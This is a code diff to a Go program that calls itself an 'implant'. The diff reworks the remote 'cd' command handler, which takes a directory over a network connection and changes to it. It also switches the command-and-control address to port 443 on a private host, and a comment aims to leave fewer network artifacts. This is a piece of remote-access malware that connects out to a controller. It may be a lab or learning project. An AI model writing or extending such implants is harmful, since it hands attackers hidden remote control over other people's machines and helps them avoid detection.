@@ -5,8 +5,6 @@ import (
 	"net"
 	"os"
 	"os/exec"
-	"regexp"
-	"strings"
 	"syscall"
 	"time"
 
@@ -101,7 +99,9 @@ func terminate() {
 	os.Exit(0)
 }
 
+// Test this once home //Once it works I think it would be smart to store the data of this server side in session struct to leave less artifacts 3al network.
 func cd(conn *net.Conn, pImplantWD *string) {
+	(*conn).Write([]byte("OK\n"))
 	buff := make([]byte, 99999)
 	read_len, err := (*conn).Read(buff)
 	if err != nil {
@@ -113,21 +113,36 @@ func cd(conn *net.Conn, pImplantWD *string) {
 		return
 	}
 	buffSnapped := buff[:read_len]
-	regexCD := regexp.MustCompile(`cd\s+.+`)
-	matchCD := regexCD.FindString(string(buffSnapped))
-	if matchCD != "" {
-		dir2go := strings.Split(matchCD, " ")[1]
-		// implantWD := os.Chdir(dir2go)
-		if os.Chdir(dir2go) != nil {
-			//(*conn).Write([]byte("Error getting the dir\n"))
-			fmt.Println("Couldn't find the dir")
-		} else {
-			*pImplantWD, _ = os.Getwd()
-			fmt.Println(*pImplantWD)
-			fmt.Println("Exiting")
-			//(*conn).Write([]byte(*pImplantWD + "\n"))
-		}
+	dir2Go := string(buffSnapped)
+	err = os.Chdir(dir2Go)
+	if err != nil {
+		fmt.Println("The dir does not exist or you don't have sufficient privs")
+		(*conn).Write([]byte("RETURN\n"))
+		return
 	}
+	*pImplantWD, err = os.Getwd()
+	if err != nil {
+		fmt.Println("Error Getting the current wd. FATAL")
+		(*conn).Write([]byte("RETURN\n"))
+		return
+	}
+	(*conn).Write([]byte("OK\n"))
+	//Old Method
+	// regexCD := regexp.MustCompile(`cd\s+.+`)
+	// matchCD := regexCD.FindString(string(buffSnapped))
+	// if matchCD != "" {
+	// 	dir2go := strings.Split(matchCD, " ")[1]
+	// 	// implantWD := os.Chdir(dir2go)
+	// 	if os.Chdir(dir2go) != nil {
+	// 		//(*conn).Write([]byte("Error getting the dir\n"))
+	// 		fmt.Println("Couldn't find the dir")
+	// 	} else {
+	// 		*pImplantWD, _ = os.Getwd()
+	// 		fmt.Println(*pImplantWD)
+	// 		fmt.Println("Exiting")
+	// 		//(*conn).Write([]byte(*pImplantWD + "\n"))
+	// 	}
+	// }
 }
 
 func ls(conn *net.Conn, implantWD *string) {
@@ -143,7 +158,7 @@ func ls(conn *net.Conn, implantWD *string) {
 }
 
 func main() {
-	c2Address := "192.168.5.222:9000"
+	c2Address := "192.168.68.190:443"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
